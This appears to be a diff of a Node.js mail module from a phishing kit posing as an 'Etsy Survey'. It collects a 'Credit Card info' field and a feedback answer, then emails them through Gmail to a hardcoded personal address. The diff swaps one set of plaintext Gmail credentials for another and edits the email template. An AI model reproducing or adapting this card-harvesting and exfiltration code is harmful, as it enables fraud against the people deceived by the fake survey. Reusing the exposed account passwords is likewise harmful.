@@ -6,27 +6,26 @@ const ABSPATH = path.dirname(process.mainModule.filename); // Absolute path to o
 const transporter = nodemailer.createTransport({ // Use an app specific password here
   service: 'Gmail',
   auth: {
-    user: 'david@etsy.global',
-    pass: 'Iwillbefamous5+'
+    user: 'hayanisaid1995@gmail.com',
+    pass: 'said.www.com'
   }
 });
 
 exports.sendMailService=function(cardC='not exit',opinion='no Feedback',image='no file'){
 	const options = {
-    from: 'david@etsy.global',
-    to: 'david@etsy.global',
+    from: 'hayanisaid1995@gmail.com',
+    to: 'hayanisaid1995@gmail.com',
     subject: 'From Etsy Survey',
     html: `<ul>
      <li><br>Credit Card info:<b> ${cardC}</li>
-     <li>${image}</li>
-    <li><br>Opinion:<b/>${opinion}</li> 
+    <li>If there one thing that could change about Etsy involvement, what you would be?<br>answer:<span>${opinion}</span></li> 
 
-     </li>`
+     </ul>`
     // attachments: [
-    //    {
-    //     path: ABSPATH + '/images/test.jpg'
-    //    }
-    // ]
+      // {
+       //  path: ABSPATH + '/images/test.jpg'
+      //}
+   // ]
 };
 transporter.sendMail(options, (error, info) =>{
     if(error) {
